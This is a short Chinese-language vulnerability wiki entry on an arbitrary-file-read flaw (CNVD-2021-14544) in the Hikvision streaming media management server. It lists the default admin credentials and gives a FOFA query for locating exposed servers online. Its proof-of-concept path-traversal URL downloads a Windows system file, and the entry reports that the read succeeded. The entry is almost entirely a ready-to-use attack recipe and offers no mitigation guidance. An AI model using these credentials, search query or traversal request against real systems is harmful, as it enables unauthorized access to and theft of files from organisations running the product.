# HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544

## 漏洞描述

杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，攻击者可利用该漏洞登录后台通过文件遍历漏洞获取敏感信息

## 漏洞影响

> [!NOTE]
>
> HIKVISION 流媒体管理服务器

## FOFA

> [!NOTE]
>
> title="流媒体管理服务器"

## 漏洞复现

登录页面如下， 默认账号密码为 **admin/12345**

![](http://wikioss.peiqi.tech/vuln/hiv-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

POC如下，访问如下Url下载 system.ini文件

```
http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
```

![](http://wikioss.peiqi.tech/vuln/hiv-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

成功读取 **C:/windows/system.ini**

